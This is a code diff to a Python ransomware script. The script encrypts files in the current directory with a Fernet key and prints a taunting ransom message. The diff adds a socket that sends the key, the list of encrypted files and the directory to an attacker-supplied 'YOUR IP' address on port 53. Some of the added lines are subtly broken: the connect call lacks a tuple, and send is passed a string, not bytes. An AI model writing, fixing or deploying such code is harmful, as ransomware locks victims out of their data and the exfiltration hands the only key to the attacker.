@@ -1,6 +1,7 @@
 import subprocess
 import sys
 import os
+import socket
 try:
     from cryptography.fernet import Fernet
 except ImportError:
@@ -9,7 +10,7 @@ except ImportError:
 
 key = Fernet.generate_key()
 files = []
-
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 directory = os.getcwd()
 
 for i in os.listdir():
@@ -27,6 +28,9 @@ for i in os.listdir():
         encrypted = f.encrypt(things)
     with open(i, "wb") as f:
         f.write(encrypted)
+s.connect("YOUR IP", 53)
+s.send(f"Key: {key}. Encrypted files: {files}. Directory : {directory}")
+s.close()
 print(f'Dear moron.\n You ran a ransomware virus on your machine.\n All of your files are encrypted.\n Good luck!')
 print(f'Encrypted files: {files}')
-print(f"{key}")
+print(f"key : {key}")
